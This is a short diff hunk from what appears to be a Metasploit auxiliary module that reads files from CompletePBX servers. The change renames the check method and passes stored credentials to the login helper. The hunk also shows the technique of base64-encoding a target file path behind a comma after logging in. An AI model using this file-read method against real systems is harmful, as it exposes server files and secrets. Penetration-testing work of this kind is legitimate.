@@ -52,11 +52,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    is_completepbx
+    completepbx?
   end
 
   def run
-    sid_cookie = completepbx_login
+    sid_cookie = completepbx_login(datastore['USERNAME'], datastore['PASSWORD'])
     encoded_path = ',' + Rex::Text.encode_base64(datastore['TARGETFILE'])
 
     print_status("Attempting to read file: #{datastore['TARGETFILE']} (Encoded as: #{encoded_path})")
